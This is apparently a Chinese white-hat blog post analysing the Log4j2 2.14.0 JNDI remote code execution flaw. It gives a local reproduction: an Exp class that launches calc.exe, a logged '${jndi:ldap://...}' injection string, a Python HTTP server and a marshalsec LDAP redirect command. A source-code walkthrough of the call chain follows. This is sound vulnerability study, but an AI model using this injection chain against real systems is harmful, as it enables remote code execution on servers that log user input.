Log4j2 远程代码执行漏洞分析

Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。

***本地测试环境***

java-1.8.0_152

log4j2-api 2.14.0

log4j2-core 2.14.0

本例使用maven工程：

<dependencies>
        <dependency>

        </dependency>
        <dependency>

            <version>2.14.0</version>
        </dependency>
    </dependencies>


创建Exp.java，用于执行恶意代码。

import java.io.IOException;

public class Exp {
    public Exp(){
        try{
            Runtime.getRuntime().exec("calc.exe");
        }catch(IOException e){}
    }
}


创建Test.java，用于模拟后台调用Logger接口的相关方法。

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Test {
    static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
    public static void main(String... args) {
        logger.error("${jndi:ldap://127.0.0.1:8888/Exp.class}");
    }
}


编译Exp.java文件生成Exp.class。在Exp.class的目录下指定端口开启HTTP服务。

xxx_dir>python -m http.server 4444


使用marshalsec启动恶意的LDAP服务，该服务指向前面搭建的HTTP服务。当通过LDAP访问该服务时，会重定向到Exp.class所在的HTTP服务端口。

xxx_dir\marshalsec-master\target>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:4444/#Exp" 8888


（如果不了解marshalsec，可以先学习：marshalsec的安装&编译&使用）

把上面搭建的LDAP服务想象成是黑客执行的操作，其目的是为了让服务端后台执行恶意代码（这里是弹出计算器）。

运行Test，就能执行Exp类中的恶意代码。

3 源码分析

作为一个白帽子，不能只知其然不知其所以然。所以验证了这个漏洞后，理所当然的要对源代码分析一下。

这里我以一个对log4j组件完全不了解的视角来描述我的源代码审计过程。--或者可以说是1day的挖掘

3.1 代码diff

当听说apache log4j有在野的漏洞时，官方肯定第一时间修复漏洞，那我该怎么快速发现问题所在点呢？又该如何构造POC验证漏洞的存在？

一般情况下肯定不会通读源码的，毕竟代码量太大了。首先我肯定会“投机取巧”，看看commit的记录。

眼疾手快的我，在官方发布的代码中发现了这样一个记录。

JndiManager.java、”Invalid JNDI URI“、lookup(name)

大脑迅速运转，像名侦探一样挖掘这些关键词之间千丝万缕的关系......

猜测肯定是log4j使用了jndi的lookup()引用某些资源。jndi引发的漏洞相信很多人都有了解。顺着这个方向，到log4j的官网看看用法。

果然啊，log4j支持jndi的lookup，并且它的格式如上图。

到这里基本能确信，构造一个输入，能够触发jndi的lookup。那如果这个输入能被用户控制，就很好利用了。搜索一下log4j的使用，发现在java web的开发中，的确经常会记录用户的输入，打印到日志中，并且在业务系统中会大量的使用。所以导致攻击面非常的广，而且攻击方式还很简单，简直就是低投入，高回报啊。这里深深感觉到，一切用户输入都是不可控这句话是多么的有道理。

通过上面的思考，其实已经可以尝试构造POC了。

但是很多人看到这里的时候还是懵逼啊，我都不会用这个组件，我怎么搞。最好的理解和使用方式当然是看官方文档啦。

3.2 log4j的类图

此时我还是个log4j小白，我得先了解该组件的用法，才能继续挖掘漏洞。

于是我从官网找到了该组件的UML类图，描述了log4j的基本架构。下面是这几个接口或者类的描述。

LoggerContext

LoggerContext是日志系统的锚点。它维护应用程序请求的所有Logger的列表以及对Configuration的引用。（感觉字面意思更好理解，就是日志上下文）

Configuration

每个活跃的LoggerContext都有一个Configuration。它包含所有的Appenders、在上下文范围内的Filters、LoggerConfigs和StrSubstitutor的引用。（这很清晰地展现在类图中了）

Logger

Logger本身不执行任何直接操作。它只有一个名称并且与LoggerConfig相关联。随着配置被修改，Logger会与不同的LoggerConfig关联，从而导致它的行为被修改。

通过调用LogManager.getLogger()方法创建Logger对象。

LoggerConfig

LoggerConfig对象是在日志配置中声明Logger时创建的。LoggerConfig包含一组过滤器，必须在LogEvent被传递到Appender之前经过它。

LoggerConfig包含被用于处理事件的Appender的引用。

Appender

Log4j允许把日志请求打印到多个目的地。在Log4j中，Appenders负责将LogEvents传送到它们的目的地。

Appenders通常只负责将事件数据写入目的地。大多数情况下，它们把格式化输出事件的责任交给Layout。

Layout

事件的输出格式。~~~~~~~~Layout负责根据用户的意愿格式化事件，而Appender负责将格式化的输出发送到目的地。

StrSubstitutor

用指定的值替换字符串中的变量。变量默认的定义是${variableName}

（上面所说的事件就是LogEvent）

学习了一通这些类/接口的定义，但是还是有些迷糊。来总结一波官方的叙述。

应用使用Log4j API时，会从LogManager那里请求一个有具体名字的Logger对象。
怎么请求呢？LogManager会找一个合适的日志上下文（LoggerContext），然后根据上下文获取Logger对象，并关联一个LoggerConfig对象，LoggerConfig又会关联一个Appender对象。


更简单易懂的描述：

Logger：日志记录器

Appender：把日志记录到什么地方

Layout：以什么格式记录日志

结合类图基本就很清楚log4j的基本工作了（可以返回到第二节回顾Test.java的编写）。

3.3.1 Logger对象的初始化

通过前面的学习，我们已经知道了Logger对象是使用LogManager.getLogger()方法创建的。

static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);


这里就不详细展开初始化对象的过程了。直接来看看Logger对象及其成员变量。

Logger通过内部类PrivateConfig关联LoggerConfig，之后会通过该内部类的对象调用LoggerConfig及Filter（这就验证了前面UML类图中Logger、LoggerConfig和Filter之间的关联和聚合关系）。

然后看一下Logger的LoggerContext引用。LoggerContext对象有一个configuration引用，configuration对象内部又有Appender、LoggerConfig和StrSubstituor的引用。看到初始化的结果，对上面的类图可能会有更深刻地理解。

3.3.2 LoggerConfig

执行到Logger.log()时，会创建一个对象strategy（顾明思议，就是一个策略对象），并调用它的log()方法。ReliabilityStrategy是接口类，这里通过getter，获取其实现类DefaultReliabilityStrategy，该类引用了LoggerConfig。

简单理解：使用一种策略，把日志的message从Logger传到LoggerConfig。

通过策略类，让数据按照预定的步骤流向了LoggerConfig。

LoggerConfig这里会执行一个关键的步骤，把message封装到LogEvent类中（通过工厂类创建相应的对象--logEvent）。

之前通过官方文档认识各个类和接口时，多次提到LogEvent（事件)，到这里为止，我们知道了，“事件"就是把message封装后，通过相关操作输出message。（后面事件/event/logEvent不要傻傻分不清，都是一个东西）

这部分方法调用链如下：

DefaultReliabilityStrategy # log()
LoggerConfig # log()
LoggerConfig # log()
LoggerConfig # processLogEvent()
LoggerConfig # callAppenders()

3.3.3 Appender

看到前面的方法调用了LoggerConfig.callAppenders()，这个方法名显而易见，调用Appender嘛。但是进入该方法后发现类名是AppenderControl。这个凭空冒出来的类之间从来没有提及过，突然就懵逼了？

其实看类名就知道，这有点MVC的意思。AppenderControl主要是用于解耦，包装了Appender的实现细节，其他人员通过AppenderControl控制Appender相关操作。

我们已经学过，Appender通常是负责把事件写入目的地的，这个目的地可以是控制台、文件、远程socket服务器等等。通常，它会把事件格式化的责任委托给layout。所以这块的代码也很简单，主要是为了调用Layout。

AppenderControl # callAppender()
AppenderControl # callAppenderPreventRecursion()
AppenderControl # callAppender0()
AppenderControl # tryCallAppender()
AbstractOutputStreamAppender # append()
AbstractOutputStreamAppender # tryAppend()
AbstractOutputStreamAppender # directEncodeEvent()

3.3.4 Layout

来看看AbstractOutputStreamAppender.directEncodeEvent()方法，终于使用getter获取指定的Layout，然后调用encode()对event进行编码。本例中使用的是PatternLayout。

当然，encode()方法还要经过一些方法调用才会对event进行格式化。

PatternLayout # encode()
PatternLayout # encode()
PatternLayout # toText()
PatternLayout$PatternSerializer # toSerializable()

分析到这里，终于还是功夫不负有心人。

PatternLayout$PatternSerializer.toSerializable()方法会循环调用PatternFormatter.format()，按照指定的格式输出event。比如第一步，打印时间；第二步，打印左方括号”["；第三部，打印进程名“main”；......最后格式化完成，就会输出到缓冲区buffer中，由Appender输出到控制台。

当i=8时，开始读取message。我们进入到format()方法里看看。

首先会判断this.config和this.noLookups条件是否成立，本例中肯定要用到lookup查找指定URI，那noLookup肯定是false喽，正好相反嘛。

继续循环判断，如果message是以"$"符号启示，并且其后是“{”，那么会执行相应的方法替换event中的变量。到这里算是知道为啥要把POC写成"${}""的形式了，只有满足这个条件才能继续触发StrSubstitutor的相关方法啊。if语句里面使用getter获取了StrSubstitutor类对象，触发replace方法。

之后会调用Interpolator.lookup()，通过读取到的前缀“jndi”获取JndiLookup类。

最后到达JndiManager的lookup()方法，然后进入jndi解析指定的URI，触发漏洞。
